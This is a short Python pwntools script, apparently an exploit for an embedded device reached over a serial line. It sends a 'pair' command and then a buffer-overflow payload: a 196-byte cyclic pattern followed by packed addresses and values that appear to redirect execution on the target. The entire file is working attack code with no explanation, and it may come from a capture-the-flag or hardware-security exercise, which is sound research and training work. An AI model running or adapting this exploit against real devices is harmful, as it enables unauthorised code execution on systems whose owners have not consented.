#!/usr/bin/python3

from pwn import *
import math
import random
import sys
import time

io = serialtube(sys.argv[1], convert_newlines=False)

payload = b"pair"
io.sendline(payload)

payload = cyclic(196) + p32(0x0000c995) + p32(0x4000c000) + p32(0x20002000) + p32(32) + p32(0) + p32(0) + p32(0) + p32(0x0000adb3)
io.sendline(payload)
